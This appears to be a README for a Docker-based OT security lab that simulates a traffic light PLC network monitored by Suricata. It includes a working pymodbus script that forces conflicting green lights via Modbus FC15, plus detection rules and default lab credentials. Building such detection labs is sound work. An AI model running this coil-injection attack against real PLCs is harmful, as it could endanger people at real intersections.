


# SCADA Traffic Light Simulation & Detection Testbed

A fully containerized Operational Technology (OT) simulation testbed featuring an automated three-intersection traffic light network, real-time SCADA/HMI visualization, passive network monitoring with Suricata NIDS, an EveBox alerting console, and an adversary attack container for Modbus command injection.

---



## Architecture Overview

All components run inside an isolated Docker bridge network (`ot_net`: `192.168.10.0/24`) to simulate a localized control system environment safely.

| Component | Role | IP / Address | Notes |
| :--- | :--- | :--- | :--- |
| **OpenPLC** | Soft PLC Runtime | `192.168.10.10:502` | Executes structured text logic across 3 intersections |
| **FUXA** | SCADA / HMI | `192.168.10.20:1881` | Polls PLC via Modbus TCP; animates traffic states |
| **Suricata** | Passive NIDS | Shares `openplc` netns | Attaches directly to `eth0`; inspects Modbus traffic |
| **EveBox** | Alert Console | `localhost:5636` | Ingests `/var/log/suricata/eve.json` for analysis |
| **Kali Linux** | Attacker Node | DHCP on `ot_net` (`:3333` SSH) | Injects unauthorized Modbus commands & coil overrides |




```
           [ FUXA SCADA / HMI ] (192.168.10.20)
                     |
                     | Modbus TCP (502) [Authorized]
                     v



[ Kali Attacker ] ---> [ OpenPLC Runtime ] <--- [ Suricata NIDS (Shared NS) ]
(192.168.10.x)        (192.168.10.10)                    |
(Unauthorized FC15)                                     v
[ Eve.json Logs ]
|
v
[ EveBox UI: 5636 ]

```

---

## Physical Process: 3-Intersection Traffic Logic

The controller manages three coordinated intersections using a 30-second continuous master oscillator timer with a 4-second green wave coordination offset:
* **Intersection 1 (Main West):** Coils `%QX0.0` (Red), `%QX0.1` (Yellow), `%QX0.2` (Green)
* **Intersection 2 (Main East):** Coils `%QX0.3` (Red), `%QX0.4` (Yellow), `%QX0.5` (Green)
* **Intersection 3 (Cross Ave):** Coils `%QX0.6` (Red), `%QX0.7` (Yellow), `%QX1.0` (Green)

### Coordinated Cycle Windows

| Phase | Main West (I1) | Main East (I2 - Offset) | Cross Ave (I3) |
| :--- | :--- | :--- | :--- |
| **Green** | 0s – 14s | 4s – 18s | 22s – 27s |
| **Yellow** | 14s – 17s | 18s – 21s | 27s – 30s |
| **Red** | 17s – 30s | 21s – 22s & 0s – 4s | 0s – 22s |

---

## Detection Engineering (Suricata Rules)

The detection rules reside in `suricata/rules/modbus.rules` and combine both policy allowlisting and behavioral attack monitoring:

* **SID 1000001 (OT-POLICY):** Unauthorized Modbus communication from any IP other than FUXA (`!192.168.10.20`).
* **SID 1000002 (OT-ALERT):** Unauthorized Modbus Single Register Write (`FC06`).
* **SID 1000003 (OT-ALERT):** Unauthorized Modbus Multiple Registers Write (`FC16`).
* **SID 1000004 (OT-ATTACK):** Modbus Force Single Coil (`FC05`) targeted at lamp states.
* **SID 1000005 (OT-ATTACK):** Modbus Force Multiple Coils (`FC15`) overriding intersection logic.

---

## Quick Start

### 1. Prerequisites
* Docker and Docker Compose installed
* Linux host (recommended for raw socket and container namespace sharing)

### 2. Directory Structure
Ensure your repo contains the following configuration files:
```text
.
├── docker-compose.yml
├── Dockerfile.kali
├── attack_coils.py
├── suricata/
│   ├── rules/
│   │   └── modbus.rules
│   ├── logs/
│   └── suricata.yaml
└── README.md

```

### 3. Deploy the Lab

```bash
# Clone the repository
git clone [https://github.com/](https://github.com/)<your-username>/<your-repo-name>.git
cd <your-repo-name>

# Create log and rule directories
mkdir -p suricata/rules suricata/logs

# Build and start all services
docker compose up -d

```

### 4. Access Interfaces

* **OpenPLC Web Editor:** `http://localhost:8080` (Default: `openplc` / `openplc`)
* **FUXA SCADA HMI:** `http://localhost:1881`
* **EveBox UI:** `http://localhost:5636`
* **Kali Attacker Node (SSH):** `ssh root@localhost -p 3333` (Password: `kalilab`)

---

## Attack Simulation & Forensics

### Simulating an Attack

From the Kali container (or via SSH on port 3333), run the Python injection script using `pymodbus`:

```python
import time
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("192.168.10.10", port=502, timeout=1)
client.connect()

# Force conflicting greens across all intersections (FC15)
# Overwriting Coils 0 through 8: [T, T, F, T, F, T, F, T, T]
t0 = time.time()
while time.time() - t0 < 30:
    client.write_coils(address=0, values=[True, True, False, True, False, True, False, True, True], slave=1)

client.close()

```

### Payload Forensics in EveBox

1. Navigate to `http://localhost:5636` to observe alerts firing for `SID 1000001` and `SID 1000005`.
2. Inspect the raw hex payload in the alert details:
```
bb bc 00 00 00 09 01 0f 00 00 00 09 02 24 01

```


3. Decode the Modbus PDU structure:
* `0f` $\rightarrow$ Function Code 15 (Write Multiple Coils)
* `00 00` $\rightarrow$ Starting at Coil Address 0
* `00 09` $\rightarrow$ Target 9 Coils
* `02` $\rightarrow$ 2 Data Bytes Follow
* `24 01` $\rightarrow$ LSB-first bitmask mapping to active coil outputs (`00100100 00000001`)



---
